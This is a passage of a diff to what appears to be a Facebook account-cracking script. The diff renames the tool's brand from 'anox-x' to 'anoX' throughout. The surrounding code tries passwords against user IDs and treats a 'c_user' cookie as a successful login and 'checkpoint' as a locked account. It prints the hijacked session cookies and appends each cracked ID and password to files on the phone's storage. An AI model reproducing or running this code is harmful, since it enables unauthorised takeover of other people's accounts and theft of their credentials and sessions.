-		sys.stdout.write('\r\33[1;37m[M4-anox-x] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M4-anoX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -2011,34 +2011,34 @@ def freeq(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[1;92m[anox-x-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in anox-x_xd:
+				print('\33[1;92m[anoX-OK] '+cid+' | '+ps+'\33[0;97m')
+				if 'y' in anoX_xd:
 					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
 					cek_apk(session,coki)
 				else:
 					break
-				open('/sdcard/anox-x-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anoX-OK.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[anox-x-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					print('\33[1;91m[anoX-CP] '+cid+' | '+ps+'\33[0;97m')
+					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					cps.append(cid)
 					break
 				else:
-					open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M5-anox-x] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M5-anoX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -2092,36 +2092,36 @@ def d(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[1;92m[anox-x-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in anox-x_xd:
+				print('\33[1;92m[anoX-OK] '+cid+' | '+ps+'\33[0;97m')
+				if 'y' in anoX_xd:
 					print("\33[0;97m[💚] \33[1;98mCOOKIES : \33[0;97m"+coki)
 					cek_apk(session,coki)
 				else:
 					break
-				open('/sdcard/anox-x-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anoX-OK.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[anox-x-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					print('\33[1;91m[anoX-CP] '+cid+' | '+ps+'\33[0;97m')
+					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					cps.append(cid)
 					break
 				else:
-					open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M6-anox-x] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M6-anoX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
 
-anox-x()
+anoX()
